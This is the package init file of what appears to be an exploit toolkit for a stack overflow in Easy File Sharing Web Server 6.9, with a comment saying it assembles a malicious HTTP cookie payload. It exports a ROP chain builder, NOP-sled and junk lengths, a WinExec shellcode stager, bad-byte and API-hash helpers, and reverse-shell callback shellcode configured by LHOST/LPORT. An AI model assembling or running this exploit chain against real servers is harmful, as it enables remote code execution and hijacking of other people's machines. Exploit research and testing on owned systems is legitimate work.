# Request builder for EFS 6.9 USERID stack overflow (EDB-37951 / EDB-42256 gadget set).
# Used by check_efs69_response.py and run_aie_via_efs_callback.py to assemble the
# HTTP cookie payload that reaches fswsService as User_Joe.

from .rop import build_rop_chain, JUNK0_LEN, JUNK1_LEN, MID_NOPSLED_LEN
from .shellcode import (
    build_winexec_stager,
    build_exec_bytes,
    parse_exec_command,
    BAD_BYTES,
    WINEXEC_HASH,
    ror13,
)
from .request import build_http_request
from .shellcode_callback import (
    build_callback_bytes,
    parse_lhost_lport,
)

__all__ = [
    "build_rop_chain",
    "build_winexec_stager",
    "build_exec_bytes",
    "parse_exec_command",
    "build_callback_bytes",
    "parse_lhost_lport",
    "build_http_request",
    "BAD_BYTES",
    "WINEXEC_HASH",
    "ror13",
    "JUNK0_LEN",
    "JUNK1_LEN",
    "MID_NOPSLED_LEN",
]
